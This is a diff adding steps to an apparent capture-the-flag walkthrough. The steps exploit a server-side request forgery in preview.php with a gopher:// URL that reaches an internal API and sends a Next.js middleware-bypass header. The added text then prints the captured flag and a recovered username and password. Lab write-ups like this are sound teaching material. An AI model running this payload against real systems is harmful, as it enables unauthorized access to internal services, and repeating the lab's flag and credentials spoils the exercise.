@@ -141,4 +141,20 @@ X-Middleware-Subrequest: middleware
 gopher://127.0.0.1:10000/_GET%2520/customapi%2520HTTP/1.1%250D%250AX-Middleware-Subrequest:%2520middleware%250D%250A
 ```
 
+16. Now, we need to exploit the vulnerability on target and access the **API** page: `http://$TARGET/preview.php?url=gopher://127.0.0.1:10000/_GET%2520/customapi%2520HTTP/1.1%250D%250AX-Middleware-Subrequest:%2520middleware%250D%250A` 🔥
+
+![Next.js Exploit](images/16-req.png)
+
+17. Nice, We Got the Flag 1 🚀!
+```
+THM{363bec60df12c2cadbe9ff35393fa468}
+```
+
+18. Save The HTML in File and open it, We have more Than Flag here (CREDENTIALS). 😈
+```
+U: librarian
+P: L1br4r1AN!!
+```
+
+![Credentials](images/18-html.png)
 
